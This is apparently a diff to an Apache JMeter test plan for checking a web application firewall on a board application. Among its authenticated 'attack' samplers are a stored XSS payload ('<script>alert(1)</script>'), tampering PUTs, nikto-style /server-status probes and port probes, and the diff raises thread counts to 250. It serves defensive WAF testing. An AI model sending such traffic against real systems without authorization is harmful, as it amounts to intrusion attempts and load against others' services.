         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_attack_exec_ua" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts</stringProp>
@@ -762,7 +756,7 @@
           <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
           <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </HTTPSamplerProxy>
@@ -779,22 +773,21 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
       </hashTree>
       <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG2 App Reach Continuous" enabled="true">
         <stringProp name="TestPlan.comments">Low-rate authenticated attack traffic intended to reach the application, WAS, and DB layers after valid login.</stringProp>
-        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG2 Main Loop Controller" enabled="true">
+        <intProp name="ThreadGroup.num_threads">250</intProp>
+        <intProp name="ThreadGroup.ramp_time">10</intProp>
+        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG2 Main Loop Controller">
           <stringProp name="LoopController.loops">1000000</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
         </elementProp>
-        <stringProp name="ThreadGroup.num_threads">1</stringProp>
-        <stringProp name="ThreadGroup.ramp_time">10</stringProp>
-        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
-        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
-        <boolProp name="ThreadGroup.scheduler">true</boolProp>
-        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
-        <stringProp name="ThreadGroup.delay" />
       </ThreadGroup>
       <hashTree>
         <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults TG2" enabled="true">
@@ -803,17 +796,17 @@
           <stringProp name="HTTPSampler.protocol">${protocol}</stringProp>
           <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </ConfigTestElement>
-        <hashTree />
+        <hashTree/>
         <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager TG2" enabled="true">
-          <collectionProp name="CookieManager.cookies" />
+          <collectionProp name="CookieManager.cookies"/>
           <boolProp name="CookieManager.clearEachIteration">false</boolProp>
           <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
         </CookieManager>
-        <hashTree />
+        <hashTree/>
         <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="TG2 Global Headers" enabled="true">
           <collectionProp name="HeaderManager.headers">
             <elementProp name="Host" elementType="Header">
@@ -834,13 +827,13 @@
             </elementProp>
           </collectionProp>
         </HeaderManager>
-        <hashTree />
+        <hashTree/>
         <UniformRandomTimer guiclass="UniformRandomTimerGui" testclass="UniformRandomTimer" testname="TG2 Uniform Random Timer" enabled="true">
           <stringProp name="RandomTimer.range">15000</stringProp>
           <stringProp name="ConstantTimer.delay">30000</stringProp>
         </UniformRandomTimer>
-        <hashTree />
-        <OnceOnlyController guiclass="OnceOnlyControllerGui" testclass="OnceOnlyController" testname="TG2 App Login Once" enabled="true" />
+        <hashTree/>
+        <OnceOnlyController guiclass="OnceOnlyControllerGui" testclass="OnceOnlyController" testname="TG2 App Login Once" enabled="true"/>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_app_login_once" enabled="true">
             <stringProp name="HTTPSampler.path">/api/auth/login</stringProp>
@@ -852,7 +845,7 @@
               <collectionProp name="Arguments.arguments">
                 <elementProp name="" elementType="HTTPArgument">
                   <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                  <stringProp name="Argument.value">{"email":"${normal_login_email}","password":"${normal_login_password}"}</stringProp>
+                  <stringProp name="Argument.value">{&quot;email&quot;:&quot;${normal_login_email}&quot;,&quot;password&quot;:&quot;${normal_login_password}&quot;}</stringProp>
                   <stringProp name="Argument.metadata">=</stringProp>
                 </elementProp>
               </collectionProp>
@@ -872,14 +865,14 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract TG2 Access Token" enabled="true">
               <stringProp name="JSONPostProcessor.referenceNames">tg2_access_token</stringProp>
               <stringProp name="JSONPostProcessor.jsonPathExprs">$.accessToken</stringProp>
-              <stringProp name="JSONPostProcessor.match_numbers" />
+              <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
               <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
             </JSONPostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_app_board_create_xss" enabled="true">
@@ -892,7 +885,7 @@
             <collectionProp name="Arguments.arguments">
               <elementProp name="" elementType="HTTPArgument">
                 <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                <stringProp name="Argument.value">{"title":"xss-post","content":"&lt;script&gt;alert(1)&lt;/script&gt;"}</stringProp>
+                <stringProp name="Argument.value">{&quot;title&quot;:&quot;xss-post&quot;,&quot;content&quot;:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;}</stringProp>
                 <stringProp name="Argument.metadata">=</stringProp>
               </elementProp>
             </collectionProp>
@@ -916,7 +909,7 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
         <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG2_app_invalid_put" enabled="true">
           <stringProp name="HTTPSampler.path">/api/board/posts/1</stringProp>
@@ -928,7 +921,7 @@
             <collectionProp name="Arguments.arguments">
               <elementProp name="" elementType="HTTPArgument">
                 <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                <stringProp name="Argument.value">{"title":"tamper","content":"unexpected put"}</stringProp>
+                <stringProp name="Argument.value">{&quot;title&quot;:&quot;tamper&quot;,&quot;content&quot;:&quot;unexpected put&quot;}</stringProp>
                 <stringProp name="Argument.metadata">=</stringProp>
               </elementProp>
             </collectionProp>
@@ -952,22 +945,21 @@
               </elementProp>
             </collectionProp>
           </HeaderManager>
-          <hashTree />
+          <hashTree/>
         </hashTree>
       </hashTree>
       <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG3 Periodic Burst Traffic" enabled="true">
         <stringProp name="TestPlan.comments">Periodic burst traffic for access-log spikes. Each cycle pauses, sends a board list burst, pauses again, then sends slow nikto-style probes and invalid route bursts.</stringProp>
-        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG3 Main Loop Controller" enabled="true">
+        <intProp name="ThreadGroup.num_threads">250</intProp>
+        <intProp name="ThreadGroup.ramp_time">30</intProp>
+        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">false</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG3 Main Loop Controller">
           <stringProp name="LoopController.loops">1000</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
         </elementProp>
-        <stringProp name="ThreadGroup.num_threads">20</stringProp>
-        <stringProp name="ThreadGroup.ramp_time">30</stringProp>
-        <boolProp name="ThreadGroup.same_user_on_next_iteration">false</boolProp>
-        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
-        <boolProp name="ThreadGroup.scheduler">true</boolProp>
-        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
-        <stringProp name="ThreadGroup.delay" />
       </ThreadGroup>
       <hashTree>
         <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults TG3" enabled="true">
@@ -976,11 +968,11 @@
           <stringProp name="HTTPSampler.protocol">${protocol}</stringProp>
           <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </ConfigTestElement>
-        <hashTree />
+        <hashTree/>
         <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="TG3 Global Headers" enabled="true">
           <collectionProp name="HeaderManager.headers">
             <elementProp name="Host" elementType="Header">
@@ -1001,15 +993,15 @@
             </elementProp>
           </collectionProp>
         </HeaderManager>
-        <hashTree />
+        <hashTree/>
         <TestAction guiclass="TestActionGui" testclass="TestAction" testname="TG3 Pause Before Burst A" enabled="true">
           <intProp name="ActionProcessor.action">1</intProp>
           <intProp name="ActionProcessor.target">0</intProp>
           <stringProp name="ActionProcessor.duration">600000</stringProp>
         </TestAction>
-        <hashTree />
+        <hashTree/>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG3 Burst A Board List Flood" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG3_burst_a_board_list" enabled="true">
@@ -1019,7 +1011,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -1032,7 +1024,7 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <TestAction guiclass="TestActionGui" testclass="TestAction" testname="TG3 Pause Before Burst B" enabled="true">
@@ -1040,7 +1032,7 @@
           <intProp name="ActionProcessor.target">0</intProp>
           <stringProp name="ActionProcessor.duration">600000</stringProp>
         </TestAction>
-        <hashTree />
+        <hashTree/>
         <LoopController guiclass="LoopControlPanel" testclass="LoopController" testname="TG3 Burst B Loop" enabled="true">
           <stringProp name="LoopController.loops">10</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
@@ -1051,7 +1043,7 @@
             <intProp name="ActionProcessor.target">0</intProp>
             <stringProp name="ActionProcessor.duration">5000</stringProp>
           </TestAction>
-          <hashTree />
+          <hashTree/>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG3_burst_b_nikto_probe" enabled="true">
             <stringProp name="HTTPSampler.path">/server-status</stringProp>
             <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
@@ -1059,7 +1051,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -1076,7 +1068,7 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <TestAction guiclass="TestActionGui" testclass="TestAction" testname="TG3 Pause Before Burst C" enabled="true">
@@ -1084,71 +1076,70 @@
           <intProp name="ActionProcessor.target">0</intProp>
           <stringProp name="ActionProcessor.duration">600000</stringProp>
         </TestAction>
-        <hashTree />
+        <hashTree/>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG3 Burst C Port Access Probes" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG3_burst_c_8443_route" enabled="true">
-            <stringProp name="HTTPSampler.path">/</stringProp>
-            <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
-            <stringProp name="HTTPSampler.method">GET</stringProp>
-            <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
-            <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
-            <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
-            </elementProp>
-            <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+            <intProp name="HTTPSampler.connect_timeout">3000</intProp>
+            <intProp name="HTTPSampler.response_timeout">3000</intProp>
             <stringProp name="HTTPSampler.port">8443</stringProp>
-            <stringProp name="HTTPSampler.connect_timeout">3000</stringProp>
-            <stringProp name="HTTPSampler.response_timeout">3000</stringProp>
+            <stringProp name="HTTPSampler.path">/</stringProp>
+            <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+            <stringProp name="HTTPSampler.method">GET</stringProp>
+            <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+            <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
+            <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
+              <collectionProp name="Arguments.arguments"/>
+            </elementProp>
+            <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
-          <hashTree />
+          <hashTree/>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG3_burst_c_9090_route" enabled="true">
-            <stringProp name="HTTPSampler.path">/</stringProp>
-            <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
-            <stringProp name="HTTPSampler.method">GET</stringProp>
-            <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
-            <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
-            <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
-            </elementProp>
-            <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+            <intProp name="HTTPSampler.connect_timeout">3000</intProp>
+            <intProp name="HTTPSampler.response_timeout">3000</intProp>
             <stringProp name="HTTPSampler.port">9090</stringProp>
-            <stringProp name="HTTPSampler.connect_timeout">3000</stringProp>
-            <stringProp name="HTTPSampler.response_timeout">3000</stringProp>
-          </HTTPSamplerProxy>
-          <hashTree />
-          <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG3_burst_c_3306_route" enabled="true">
             <stringProp name="HTTPSampler.path">/</stringProp>
             <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
             <stringProp name="HTTPSampler.method">GET</stringProp>
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
-            <stringProp name="HTTPSampler.port">3306</stringProp>
-            <stringProp name="HTTPSampler.connect_timeout">3000</stringProp>
-            <stringProp name="HTTPSampler.response_timeout">3000</stringProp>
           </HTTPSamplerProxy>
-          <hashTree />
+          <hashTree/>
+          <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG3_burst_c_3306_route" enabled="true">
+            <intProp name="HTTPSampler.connect_timeout">3000</intProp>
+            <intProp name="HTTPSampler.response_timeout">3000</intProp>
+            <stringProp name="HTTPSampler.port">3306</stringProp>
+            <stringProp name="HTTPSampler.path">/</stringProp>
+            <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+            <stringProp name="HTTPSampler.method">GET</stringProp>
+            <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+            <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
+            <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
+              <collectionProp name="Arguments.arguments"/>
+            </elementProp>
+            <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+          </HTTPSamplerProxy>
+          <hashTree/>
         </hashTree>
       </hashTree>
       <ThreadGroup guiclass="ThreadGroupGui" testclass="ThreadGroup" testname="TG4 FP Search And URL Mixed" enabled="true">
         <stringProp name="TestPlan.comments">FP verification replay using proven 403-reduction candidates borrowed from FP_BOARD_SEARCH_URL_EXPANDED_500_V2. These are mostly documentation/demo/log/explanation style search terms that previously shifted from WAF 403 to non-403 responses when custom rules were enabled.</stringProp>
-        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG4 Main Loop Controller" enabled="true">
+        <intProp name="ThreadGroup.num_threads">250</intProp>
+        <intProp name="ThreadGroup.ramp_time">5</intProp>
+        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
+        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
+        <boolProp name="ThreadGroup.scheduler">true</boolProp>
+        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController" testname="TG4 Main Loop Controller">
           <stringProp name="LoopController.loops">1000000</stringProp>
           <boolProp name="LoopController.continue_forever">false</boolProp>
         </elementProp>
-        <stringProp name="ThreadGroup.num_threads">1</stringProp>
-        <stringProp name="ThreadGroup.ramp_time">5</stringProp>
-        <boolProp name="ThreadGroup.same_user_on_next_iteration">true</boolProp>
-        <stringProp name="ThreadGroup.on_sample_error">continue</stringProp>
-        <boolProp name="ThreadGroup.scheduler">true</boolProp>
-        <stringProp name="ThreadGroup.duration">${duration_seconds}</stringProp>
-        <stringProp name="ThreadGroup.delay" />
       </ThreadGroup>
       <hashTree>
         <ConfigTestElement guiclass="HttpDefaultsGui" testclass="ConfigTestElement" testname="HTTP Request Defaults TG4" enabled="true">
@@ -1157,17 +1148,17 @@
           <stringProp name="HTTPSampler.protocol">${protocol}</stringProp>
           <stringProp name="HTTPSampler.contentEncoding">UTF-8</stringProp>
           <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-            <collectionProp name="Arguments.arguments" />
+            <collectionProp name="Arguments.arguments"/>
           </elementProp>
           <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
         </ConfigTestElement>
-        <hashTree />
+        <hashTree/>
         <CookieManager guiclass="CookiePanel" testclass="CookieManager" testname="HTTP Cookie Manager TG4" enabled="true">
-          <collectionProp name="CookieManager.cookies" />
+          <collectionProp name="CookieManager.cookies"/>
           <boolProp name="CookieManager.clearEachIteration">false</boolProp>
           <boolProp name="CookieManager.controlledByThreadGroup">false</boolProp>
         </CookieManager>
-        <hashTree />
+        <hashTree/>
         <HeaderManager guiclass="HeaderPanel" testclass="HeaderManager" testname="TG4 Global Headers" enabled="true">
           <collectionProp name="HeaderManager.headers">
             <elementProp name="Host" elementType="Header">
@@ -1188,8 +1179,8 @@
             </elementProp>
           </collectionProp>
         </HeaderManager>
-        <hashTree />
-        <OnceOnlyController guiclass="OnceOnlyControllerGui" testclass="OnceOnlyController" testname="TG4 Login Once" enabled="true" />
+        <hashTree/>
+        <OnceOnlyController guiclass="OnceOnlyControllerGui" testclass="OnceOnlyController" testname="TG4 Login Once" enabled="true"/>
         <hashTree>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG4_login_once" enabled="true">
             <stringProp name="HTTPSampler.path">/api/auth/login</stringProp>
@@ -1201,7 +1192,7 @@
               <collectionProp name="Arguments.arguments">
                 <elementProp name="" elementType="HTTPArgument">
                   <boolProp name="HTTPArgument.always_encode">false</boolProp>
-                  <stringProp name="Argument.value">{"email":"${normal_login_email}","password":"${normal_login_password}"}</stringProp>
+                  <stringProp name="Argument.value">{&quot;email&quot;:&quot;${normal_login_email}&quot;,&quot;password&quot;:&quot;${normal_login_password}&quot;}</stringProp>
                   <stringProp name="Argument.metadata">=</stringProp>
                 </elementProp>
               </collectionProp>
@@ -1221,23 +1212,23 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSONPostProcessor guiclass="JSONPostProcessorGui" testclass="JSONPostProcessor" testname="Extract FP Access Token" enabled="true">
               <stringProp name="JSONPostProcessor.referenceNames">fp_access_token</stringProp>
               <stringProp name="JSONPostProcessor.jsonPathExprs">$.accessToken</stringProp>
-              <stringProp name="JSONPostProcessor.match_numbers" />
+              <stringProp name="JSONPostProcessor.match_numbers"></stringProp>
               <stringProp name="JSONPostProcessor.defaultValues">NOT_FOUND</stringProp>
             </JSONPostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <UniformRandomTimer guiclass="UniformRandomTimerGui" testclass="UniformRandomTimer" testname="TG4 Uniform Random Timer" enabled="true">
           <stringProp name="RandomTimer.range">${fp_random_delay_ms}</stringProp>
           <stringProp name="ConstantTimer.delay">${fp_base_delay_ms}</stringProp>
         </UniformRandomTimer>
-        <hashTree />
+        <hashTree/>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG4 Board Search Mixed" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <CSVDataSet guiclass="TestBeanGUI" testclass="CSVDataSet" testname="TG4 Board Search Mixed CSV" enabled="true">
@@ -1251,7 +1242,7 @@
             <boolProp name="stopThread">false</boolProp>
             <stringProp name="variableNames">fp_case_id,fp_case_class,fp_board_query_suffix</stringProp>
           </CSVDataSet>
-          <hashTree />
+          <hashTree/>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG4_board_search_mixed_case" enabled="true">
             <stringProp name="HTTPSampler.path">/api/board/posts${fp_board_query_suffix}</stringProp>
             <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
@@ -1259,7 +1250,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -1284,19 +1275,19 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSR223PostProcessor guiclass="TestBeanGUI" testclass="JSR223PostProcessor" testname="Accept Mixed Search Statuses" enabled="true">
               <stringProp name="cacheKey">true</stringProp>
-              <stringProp name="filename" />
-              <stringProp name="parameters" />
+              <stringProp name="filename"></stringProp>
+              <stringProp name="parameters"></stringProp>
               <stringProp name="scriptLanguage">groovy</stringProp>
-              <stringProp name="script">def code = prev.getResponseCode()\nif (code != '403') {\n    prev.setSuccessful(true)\n    prev.setResponseMessage('Accepted non-403 status: ' + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage('WAF 403 remained for FP candidate')\n}\n</stringProp>
+              <stringProp name="script">def code = prev.getResponseCode()\nif (code != &apos;403&apos;) {\n    prev.setSuccessful(true)\n    prev.setResponseMessage(&apos;Accepted non-403 status: &apos; + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage(&apos;WAF 403 remained for FP candidate&apos;)\n}\n</stringProp>
             </JSR223PostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG4 Board Search Expanded" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <CSVDataSet guiclass="TestBeanGUI" testclass="CSVDataSet" testname="TG4 Board Search Expanded CSV" enabled="true">
@@ -1310,7 +1301,7 @@
             <boolProp name="stopThread">false</boolProp>
             <stringProp name="variableNames">fp_case_id,fp_case_class,fp_board_query_suffix</stringProp>
           </CSVDataSet>
-          <hashTree />
+          <hashTree/>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG4_board_search_expanded_case" enabled="true">
             <stringProp name="HTTPSampler.path">/api/board/posts${fp_board_query_suffix}</stringProp>
             <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
@@ -1318,7 +1309,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -1343,19 +1334,19 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSR223PostProcessor guiclass="TestBeanGUI" testclass="JSR223PostProcessor" testname="Accept Expanded Search Statuses" enabled="true">
               <stringProp name="cacheKey">true</stringProp>
-              <stringProp name="filename" />
-              <stringProp name="parameters" />
+              <stringProp name="filename"></stringProp>
+              <stringProp name="parameters"></stringProp>
               <stringProp name="scriptLanguage">groovy</stringProp>
-              <stringProp name="script">def code = prev.getResponseCode()\nif (code != '403') {\n    prev.setSuccessful(true)\n    prev.setResponseMessage('Accepted non-403 status: ' + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage('WAF 403 remained for FP candidate')\n}\n</stringProp>
+              <stringProp name="script">def code = prev.getResponseCode()\nif (code != &apos;403&apos;) {\n    prev.setSuccessful(true)\n    prev.setResponseMessage(&apos;Accepted non-403 status: &apos; + code)\n} else {\n    prev.setSuccessful(false)\n    prev.setResponseMessage(&apos;WAF 403 remained for FP candidate&apos;)\n}\n</stringProp>
             </JSR223PostProcessor>
-            <hashTree />
+            <hashTree/>
           </hashTree>
         </hashTree>
         <TransactionController guiclass="TransactionControllerGui" testclass="TransactionController" testname="TG4 Public Search Mixed" enabled="true">
-          <boolProp name="TransactionController.parent">false</boolProp>
+          <boolProp name="TransactionController.includeTimers">true</boolProp>
         </TransactionController>
         <hashTree>
           <CSVDataSet guiclass="TestBeanGUI" testclass="CSVDataSet" testname="TG4 Public Search CSV" enabled="true">
@@ -1369,7 +1360,7 @@
             <boolProp name="stopThread">false</boolProp>
             <stringProp name="variableNames">fp_case_id,fp_case_class,fp_public_raw_path</stringProp>
           </CSVDataSet>
-          <hashTree />
+          <hashTree/>
           <HTTPSamplerProxy guiclass="HttpTestSampleGui" testclass="HTTPSamplerProxy" testname="TG4_public_search_case" enabled="true">
             <stringProp name="HTTPSampler.path">${fp_public_raw_path}</stringProp>
             <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
@@ -1377,7 +1368,7 @@
             <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
             <boolProp name="HTTPSampler.postBodyRaw">false</boolProp>
             <elementProp name="HTTPsampler.Arguments" elementType="Arguments" guiclass="HTTPArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
-              <collectionProp name="Arguments.arguments" />
+              <collectionProp name="Arguments.arguments"/>
             </elementProp>
             <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
           </HTTPSamplerProxy>
@@ -1398,19 +1389,19 @@
                 </elementProp>
               </collectionProp>
             </HeaderManager>
-            <hashTree />
+            <hashTree/>
             <JSR223PostProcessor guiclass="TestBeanGUI" testclass="JSR223PostProcessor" testname="Accept Public Search Statuses" enabled="true">
               <stringProp name="cacheKey">true</stringProp>
-              <stringProp name="filename" />
